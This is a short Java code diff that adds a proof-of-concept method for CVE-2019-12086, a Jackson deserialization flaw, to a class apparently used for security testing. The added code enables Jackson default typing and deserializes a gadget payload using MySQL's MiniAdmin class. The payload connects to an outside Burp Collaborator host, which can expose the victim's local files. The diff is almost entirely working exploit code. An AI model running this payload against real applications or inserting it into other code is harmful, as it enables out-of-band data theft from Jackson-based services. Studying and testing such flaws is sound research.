@@ -4,8 +4,11 @@ import com.fasterxml.jackson.databind.ObjectMapper;
 
 import com.fasterxml.jackson.databind.SerializationFeature;
 
+import java.io.IOException;
+
 import org.h2.Driver;
 
+import com.mysql.cj.admin.*;
 
 public class JacksonSerial {
 	
@@ -47,5 +50,21 @@ public class JacksonSerial {
 		}
 		
 		
+	}
+	
+	/*
+	 * CVE-2019-12086
+	 */
+	public static void cve201912086()
+	{
+		String payload="[\"com.mysql.cj.jdbc.admin.MiniAdmin\",\"jdbc:mysql://jackson.gn78ew4lm9ktv0qgs9wfqs6tzk5bt0.burpcollaborator.net/jackson\"]";
+
+        ObjectMapper mapper = new ObjectMapper();
+        mapper.enableDefaultTyping();
+        try {
+            mapper.readValue(payload, Object.class);
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
 	}
 }
